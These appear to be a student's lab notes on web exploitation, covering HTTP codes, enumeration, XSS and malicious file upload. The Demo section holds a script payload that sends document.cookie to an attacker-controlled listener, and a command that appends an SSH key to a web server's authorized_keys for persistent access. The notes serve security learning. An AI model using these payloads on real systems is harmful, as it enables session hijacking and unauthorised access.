# Web Exploitation


# HTTP Response Codes

- 10X = Informational

- 2XX = Success

- 30X = Redirection

- 4XX = Client Error

- 5XX = Server Error
# Enumeration

- Robots.txt: list off different directorys contained in web server
# Cross-Site Scripting (XSS) Overview
- Allows us to arbitaurily place code on a webpage


# Reflected XSS

- Deliver something to server and someone clicks it similiar to phishing through a email

- You put the vulnerability on the server and someone else interacts with it
# Stored XSS

- Already on server and know how to exploit

- The server already has the vulnerability and you interact with it

- example with scripts
  - <script>alert('XSS');</script> = tells us if a site is vulnerble to XSS

  - <img src="http://invalid" onerror="window.open('http://10.50.28.71/java/fruit-7.jpg','xss','height=1,width=1');">(check code)

# Malicious File Upload

- Site alows unsanitized file uploads

- Does not check extension, Allows for code execution
# Demo 

- Script
  - Script http-enum.nse (run when a http port is open {80})

- python3 -m http.server

- <script>document.location="http://<LinopIP>:8000/"+document.cookie;</script>

- ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/9aktlN9GzIIUWJGEVAClDU5v7AM4M8MbT5ETYTjlnG8Lte+2V11I5dnksfLZcNcYhUF7ai0eD4/xtn3lm8QOK+6nLd1mCoh9OKnB7U9ulN4YQdSPkTYBoACMHGeu4rp73W5u1yBDK8fdLsX5f7ZumcRvqGYGDDHF9SdShDWCVRo9rt7hicLo/MyYCRDnM+VTUtvCtQm4VfyAnlSyoDlPy26WTR9cADKOblJ2OFmD/VbsKZaRZAghoqNJjLGPL1dbXNTVVgJwo3cExkDrnOopUmUPqFPmnU2cNMEtF/Wp+donsEFhxfnSI0jl7pD8tiO4j2vKnrCoEJ0nDOnreZVV student@lin-ops

- ssh "public Key" >> var/www/ .ssh/authroized_keys
